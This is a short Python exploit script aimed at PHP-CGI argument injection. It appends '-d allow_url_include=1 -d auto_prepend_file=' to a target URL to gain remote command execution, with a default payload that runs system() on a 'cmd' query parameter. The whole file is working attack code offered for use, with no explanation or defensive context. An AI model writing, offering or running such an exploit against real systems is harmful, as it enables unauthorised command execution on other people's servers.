#!/usr/bin/env python

import requests

def exploit(target_url, check_string, payload):
    # Construct the URL
    url = target_url + '?-d+allow_url_include=1+-d+auto_prepend_file=' + payload

    # Send the request
    response = requests.get(url)

    # Check if the check_string is present in the response
    if check_string in response.text:
        print('Command execution successful')
    else:
        print('Command execution failed')

# Get user input for the target URL, check string, and payload
target_url = input('Enter the target URL with vulnerable php(example: https://example.com/vulnerable.php): ')
check_string = input('Enter the check string: ')
payload = input('Enter the payload (default: ;echo system($_GET["cmd"]);// ): ')

# Use default payload if not provided
if not payload:
    payload = ';echo system($_GET["cmd"]);//'

# Call the exploit function
exploit(target_url, check_string, payload)
